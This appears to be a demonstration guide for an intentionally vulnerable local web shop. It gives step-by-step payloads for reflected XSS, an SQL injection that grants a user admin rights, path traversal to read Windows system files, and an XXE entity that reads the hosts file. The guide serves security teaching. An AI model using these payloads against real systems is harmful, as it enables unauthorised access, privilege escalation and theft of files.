# Demonstration Scenario(s)

	- Go to Home Page (localhost:8888) and click on SHOP from the top menu.
    - In the "search keywords" textbox, enter the following:

        ###<i><script>alert("hacking")</script></i>

    - Notice that the JavaScript is executed in the browser.
---
	- In the "search keywords" textbox, enter the following:

        ### test'

    - Click on Search.
    - An Error message will be displayed.
    - Click on SHOW DETAILS to see the error and notice that the "search keywords" are being passed through to the Database without being sanitised.
---
    - Click on My Account -> Login from the top-right menu.
    - Login as "user1@localhost.com", password as "password".
	- Hover over the username (user1) on the top-right menu. Notice that the drop-down menu contains "Home", "API Explorer" and "Logout" only.
	- In the "search keywords" textbox, enter the following:

        ###'; INSERT INTO user_authorities (authority_id, user_id) VALUES ('05970e74-c82b-4e21-b100-f8184d6e3454', '32e7db01-86bc-4687-9ecb-d79b265ac14f') --

	- Click on Search.
    - A message such as the following will be shown:

        ### Searching for: ###'; INSERT INTO user_authorities (authority_id, user_id) VALUES ('05970e74-c82b-4e21-b100-f8184d6e3454', '32e7db01-86bc-4687-9ecb-d79b265ac14f') --
    
    - Hover over the username (user1) on the top-right menu select Logout.
    - Login again with the same credentials as given above.
    - Hover over the username (user1) on the top-right. Notice that the deop-down menu will additionally contain "Site Administration" and "Database Console".
    - Click on user1 and notice that the user is redirected to the admin home page.
    - The user has now become an administrator.
---
	- Go to Home Page.
    - Login as "user1@localhost.com", password as "password".
	- Click on "Download Files" from the user menu.
	- Enter "c:\\windows\\system.ini" and click on "Submit".
	- The Browser will prompt you to keep or discard the "system.ini" file which is being downloaded.
	- Open a new browser tab.
	- Enter "http://localhost:8888//user/files/download/unverified?file=../../../../../../windows/system.ini".
	- The Browser will prompt to keep or discard the "system.ini" file which is being downloaded.
	- Any "*secret and sensitive files*" can be downloaded using this exploit.
---
	- Go to Home Page.
    - Login as "user1@localhost.com", password as "password".
	- Click "Upload Files" from the user menu.
	- Upload the XML file [samples\profile.xml](samples\profile.xml) by clicking on "Choose File" and "Submit".
	- Once you uploaded the file successfully, you will be able to see the file "name" and its "content`.
	- In the Content box change some of the data and click on Save to show that the data can be changed.
	- Now replace the content with the following (make sure there are no leading spaces):

        <?xml version="1.0" encoding="utf-8"?><!DOCTYPE order[  <!ENTITY myExternalEntity SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order>&myExternalEntity;</order>

    - Click on Save.
	- Now the server hosts file will be shown as the content of updated XML file.
